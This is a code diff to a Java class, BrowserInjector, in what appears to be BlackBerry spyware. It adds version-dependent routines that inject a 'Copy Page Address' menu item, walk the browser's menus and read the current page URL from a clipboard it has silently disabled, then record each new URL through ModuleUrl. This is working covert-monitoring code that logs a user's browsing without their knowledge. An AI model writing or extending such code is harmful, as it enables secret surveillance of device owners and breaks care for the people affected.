@@ -2,8 +2,10 @@ package blackberry.injection.injectors;
 
 import net.rim.device.api.system.Clipboard;
 import net.rim.device.api.ui.Screen;
+import blackberry.Device;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.injection.BrowserMenu;
 import blackberry.injection.MenuWalker;
 import blackberry.injection.injectors.group.UrlGroupInjector;
 import blackberry.module.ModuleUrl;
@@ -35,8 +37,34 @@ public class BrowserInjector extends UrlGroupInjector {
         debug.trace("playOnScreen: " + screen);
         //#endif    
 
+        if (Device.getInstance().lessThan(6, 0)) {
+            urlByContext(screen);
+        } else {
+            urlByCopy(screen);
+        }
+    }
+
+    public void urlByContext(Screen screen) {
+        String menuName = "Copy Page Address";
+        BrowserMenu menu = new BrowserMenu(this, menuName);
+        menu.addMenu();
+        boolean ret = MenuWalker.walk(menuName, screen, true);
+        if (ret) {
+
+        }
+
+        menu.removeMenu();
+    }
+
+    public void urlByCopy(Screen screen) {
+        //#ifdef DEBUG
+        debug.trace("playOnScreen: " + screen);
+        //#endif    
+
+        String menuName = "Copy Page Address";
+
         disableClipboard();
-        boolean ret = MenuWalker.walk("Copy Page Address", screen, true);
+        boolean ret = MenuWalker.walk(menuName, screen, true);
 
         if (ret) {
 
@@ -46,18 +74,7 @@ public class BrowserInjector extends UrlGroupInjector {
                 //#ifdef DEBUG
                 debug.trace("playOnScreen, URL FOUND:" + url);
                 //#endif
-                if (!url.equals(lastUrl)) {
-                    lastUrl = url;
-                    //#ifdef DEBUG
-                    debug.info("NEW URL: " + url);
-                    //#endif
-
-                    saveUrl(url);
-                } else {
-                    //#ifdef DEBUG
-                    debug.trace("playOnScreen: same url");
-                    //#endif
-                }
+                saveUrl(url);
             }
         } else {
             //#ifdef DEBUG
@@ -66,14 +83,29 @@ public class BrowserInjector extends UrlGroupInjector {
 
         }
         enableClipboard();
+
     }
 
-    private void saveUrl(String url) {
+    public void saveUrl(String url) {
         //#ifdef DEBUG
         debug.trace("saveUrl");
         //#endif
-        
-        ModuleUrl.getInstance().saveUrl(url);
+
+        if (url != null) {
+            if (!url.equals(lastUrl)) {
+                lastUrl = url;
+                //#ifdef DEBUG
+                debug.info("NEW URL: " + url);
+                //#endif
+
+                ModuleUrl.getInstance().saveUrl(url);
+            } else {
+                //#ifdef DEBUG
+                debug.trace("playOnScreen: same url");
+                //#endif
+            }
+
+        }
     }
 
 }
